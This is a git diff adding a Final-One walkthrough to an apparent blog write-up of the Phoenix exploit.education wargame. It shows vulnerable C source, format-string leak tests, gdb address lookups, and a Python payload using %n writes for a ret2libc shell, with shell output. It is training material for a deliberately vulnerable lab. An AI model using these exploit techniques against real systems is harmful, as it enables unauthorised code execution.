@@ -102,8 +102,8 @@ If everything worked, your terminal (via WSL) should show a login prompt and boo
 </div>
 
 ---
-
 *“The beginning of the end” — Djo*
+---
 
 # Final-Zero
 
@@ -375,13 +375,10 @@ If the process exits without a shell:
 
 ---
 
-## Takeaways (Stack-Series Style)
+## Takeaways
 
-* **Remote exploitation ≠ remote debugging**
+* Remote exploitation ≠ remote debugging
 * Core dumps bridge the gap
-* Same binary + same offsets = valid exploit
-* NX off → shellcode viable
-* Debuggers are a **privilege**, not a guarantee
 
 ---
 
@@ -418,9 +415,400 @@ s.send(payload + execve + binsh + b'\x00'*8)
 
 ```c
 root@phoenix-amd64:/opt/phoenix/i486# python /tmp/wsx.py
-root@phoenix-amd64:/opt/phoenix/i486# [23881.177136] traps: final-zero[2185] general protection ip:4141414141414141 sp:7fffffffec10 error:0
+root@phoenix-amd64:/opt/phoenix/i486# [23881.177136] traps: final-zero[2185] 
+general protection ip:4141414141414141 sp:7fffffffec10 error:0
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
+---
 
+<div class="image-row">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
+</div>
+
+---
+
+# Final-One
+
+**Challenge**: [Phoenix/Final-One](https://exploit.education/phoenix/final-one/)
+
+**Goal**: Exploit the unsafe use of `fprintf()` in the network-facing binary to overwrite address and execute attacker-controlled code, resulting in successful level completion.
+
+---
+
+## Environment
+
+While exploring the source code and disassembly, it becomes clear that we need to run the binary with the `--test` argument to debug locally before attempting any remote interaction.
+
+```bash
+user@phoenix-amd64:/opt/phoenix/i486$ ./final-one --test
+Welcome to phoenix/final-one, brought to you by https://exploit.education
+[final1] $ login nastja
+invalid protocol
+[final1] $ username nastja
+[final1] $ login AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Login from testing:12121 as [nastja] with password [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]
+login failed
+[final1] $
+```
+
+---
+
+## Binary Analysis
+
+Initially, `strcpy()` looked suspicious and suggested a possible **buffer overflow**. However, after examining the use of `fgets()` and the buffer sizes, a classic overflow appears unlikely.
+
+Below is the relevant portion of the source code:
+
+```c
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+char username[128];
+char hostname[64];
+FILE *output;
+
+void logit(char *pw) {
+  char buf[2048];
+
+  snprintf(buf, sizeof(buf), "Login from %s as [%s] with password [%s]\n",
+      hostname, username, pw);
+
+  fprintf(output, buf);
+}
+
+void trim(char *str) {
+  char *q;
+
+  q = strchr(str, '\r');
+  if (q) *q = 0;
+  q = strchr(str, '\n');
+  if (q) *q = 0;
+}
+
+void parser() {
+  char line[128];
+
+  printf("[final1] $ ");
+
+  while (fgets(line, sizeof(line) - 1, stdin)) {
+    trim(line);
+    if (strncmp(line, "username ", 9) == 0) {
+      strcpy(username, line + 9);
+    } else if (strncmp(line, "login ", 6) == 0) {
+      if (username[0] == 0) {
+        printf("invalid protocol\n");
+      } else {
+        logit(line + 6);
+        printf("login failed\n");
+      }
+    }
+    printf("[final1] $ ");
+  }
+}
+
+int testing;
+
+void getipport() {
+  socklen_t l;
+  struct sockaddr_in sin;
+
+  if (testing) {
+    strcpy(hostname, "testing:12121");
+    return;
+  }
+
+  l = sizeof(struct sockaddr_in);
+  if (getpeername(0, (void *)&sin, &l) == -1) {
+    err(1, "you don't exist");
+  }
+
+  sprintf(hostname, "%s:%d", inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
+}
+
+int main(int argc, char **argv, char **envp) {
+  if (argc >= 2) {
+    testing = !strcmp(argv[1], "--test");
+    output = stderr;
+  } else {
+    output = fopen("/dev/null", "w");
+    if (!output) {
+      err(1, "fopen(/dev/null)");
+    }
+  }
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  setvbuf(stderr, NULL, _IONBF, 0);
+
+  printf("%s\n", BANNER);
+
+  getipport();
+  parser();
+
+  return 0;
+}
+```
+
+---
+
+## Identifying the Vulnerability
+
+Looking closely at the `logit()` function:
+
+```c
+void logit(char *pw) {
+  char buf[2048];
+
+  snprintf(buf, sizeof(buf), "Login from %s as [%s] with password [%s]\n",
+      hostname, username, pw);
+
+  fprintf(output, buf);
+}
+```
+
+### Key Issue
+
+The vulnerability lies in this line:
+
+```c
+fprintf(output, buf);
+```
+
+Here, `buf` is directly used as the **format string** for `fprintf`.
+
+If user input contains **format specifiers** (like `%x`, `%s`, `%n`), `fprintf` will interpret them as formatting instructions rather than plain text.
+
+This creates a **Format String Vulnerability**.
+
+---
+
+## Verifying the Format String Bug
+
+To test this, we run the binary in testing mode:
+
+```bash
+./final-one --test
+```
+
+Then provide format specifiers as the password:
+
+```bash
+[final1] $ username AAAAAAAABBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF
+GGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMNNNNNNNNOOOOO
+[final1] $ login %x %x %x %x %x %x %x %x %x %x %x %x %x 
+%x %x %x %x %x %x %x
+```
+
+Output:
+
+```
+Login from testing:12121 as [AAAAAAAABBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF
+GGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMNNNNNNNNOOOOO] with 
+password [0 0 69676f4c 7266206e 74206d6f 69747365 313a676e 31323132 20736120 
+4141415b 41414141 42424241 42424242 43434343 43434343 44444444 44444444 
+45454545 45454545 46464646]
+login failed
+```
+
+---
+
+## Exploitation Strategy
+
+One reliable way to exploit this vulnerability is by using **ret2libc**.
+
+For a ret2libc attack we need the following values:
+
+* **Return address** (location we overwrite)
+* **`system()` address**
+* **Pointer to `/bin/sh`**
+* **`exit()` address** (optional but useful to avoid crashes after shell execution)
+
+### Stack Layout
+
+The crafted stack should look like this:
+
+```
+system() address
+exit() address
+/bin/sh pointer
+```
+
+When execution returns to this location:
+
+1. `system("/bin/sh")` executes
+2. `exit()` runs afterward for stability
+
+---
+
+## Locating Required Addresses
+
+Using **GDB**, we can retrieve the necessary libc symbols.
+
+### `system()` Address
+
+```bash
+(gdb) p system
+$2 = {<text variable, no debug info>} 0xf7fad824 <system>
+```
+
+### `exit()` Address
+
+```bash
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xf7f7f543 <exit>
+```
+
+---
+
+### Locating `/bin/sh` in Memory
+
+Using `find` or direct memory inspection within the mapped `libc` region:
+
+```bash
+(gdb) x/s 0xf7ff867a
+0xf7ff867a: "/bin/sh"
+```
+
+Now we have all required components for the ret2libc chain.
+
+---
+
+## GDB Setup
+
+To stabilize the environment (reduce address variation), I used the following `.gdbscript`:
+
+```bash
+/tmp/.gdbscript
+
+unset env LINES
+unset env COLUMNS
+unset env TERM
+unset env _
+unset env OLDPWD
+unset env SHLVL
+set breakpoint pending on
+b system
+run --test < <(python /tmp/edc.py)
+x/12x 0xffffdcbc //orwhatevr the ret address is
+```
+
+Run the program in GDB using:
+
+```bash
+(gdb) set follow-fork-mode child
+(gdb) set detach-on-fork off
+(gdb) run
+```
+
+This allows easier observation of the stack and confirms whether execution reaches `system()`.
+
+---
+
+## Exploit Payload
+
+The exploit script crafts a payload that:
+
+1. Places **target return addresses** into the username buffer
+2. Uses the **format string vulnerability**
+3. Writes byte-by-byte using `%n` to overwrite the return address
+4. Redirects execution into `system()`
+
+Your payload:
+
+```python
+user@phoenix-amd64:/opt/phoenix/i486$ cat /tmp/edc.py
+import struct
+
+# 0xf7f7f543 <exit>
+#system's address 0xf7fad824
+
+ret = 0xffffdcbc
+
+bomb = "username "
+bomb+= b"AAA"
+bomb+= struct.pack("I", ret)
+bomb+= b"AAAA"   #this is important because our %x needs 
+#to read something for spacing to add
+bomb+= struct.pack("I", ret+1)
+bomb+= b"AAAA"
+bomb+= struct.pack("I", ret+2)
+bomb+= b"AAAA"
+bomb+= struct.pack("I", ret+3)
+bomb+= b"AAAA"
+bomb+= struct.pack("I", ret+4)
+bomb+= b"AAAA"
+bomb+= struct.pack("I", ret+5)
+bomb+= b"AAAA"
+bomb+= struct.pack("I", ret+6)
+bomb+= b"AAAA"
+bomb+= struct.pack("I", ret+7)
+bomb+= b"AAAA"
+bomb+= struct.pack("I", ret+8)
+bomb+= b"AAAA"
+bomb+= struct.pack("I", ret+9)
+bomb+= b"AAAA"
+bomb+= struct.pack("I", ret+10)
+bomb+= b"AAAA"
+bomb+= struct.pack("I", ret+11)
+
+bomb+= "\n"
+
+bomb+= "login "
+bomb+= "%x %x %x %x %x %x %x %x "
+bomb+= "%x"
+bomb+= "%85x"
+bomb+= "%n"
+bomb+= "%180x"
+bomb+= "%n"
+bomb+= "%34x"
+bomb+= "%n"
+bomb+= "%253x"
+bomb+= "%n"
+
+bomb+= "%76x"
+bomb+= "%n"
+bomb+= "%178x"
+bomb+= "%n"
+bomb+= "%258x"
+bomb+= "%n"
+bomb+= "%256x"
+bomb+= "%n"
+
+bomb+= "%131x"
+bomb+= "%n"
+bomb+= "%12x"
+bomb+= "%n"
+bomb+= "%121x"
+bomb+= "%n"
+bomb+= "%248x"
+bomb+= "%n"
+bomb+= "\n"
+print(bomb)
+```
+
+---
+
+## Running the Exploit
+
+Execute the payload and pipe it into the vulnerable binary:
+
+```bash
+(python /tmp/edc.py; cat) | ./final-one --test
+```
+Result:
+
+```bash
+test@phoenix-amd64:/opt/phoenix/i486$ (python /tmp/edc.py; cat) | ./final-one --t
+Welcome to phoenix/final-one, brought to you by https://exploit.education
+[final1] $ [final1] $ Login from testing:12121 as [AAA����AAAA����AAAA����AAAA
+����AAAA����AAAA����AAAA����AAAA����
+AAAA����AAAA����AAAA����AAAA����] with password [0 0 69676f4c 7266206e 
+74206d6f 69747365 313a676e 31323132 20736120  4141415b 41414141 41414141 41414141 41414141] 
+id
+uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
+whoami
+user
+```
 ---
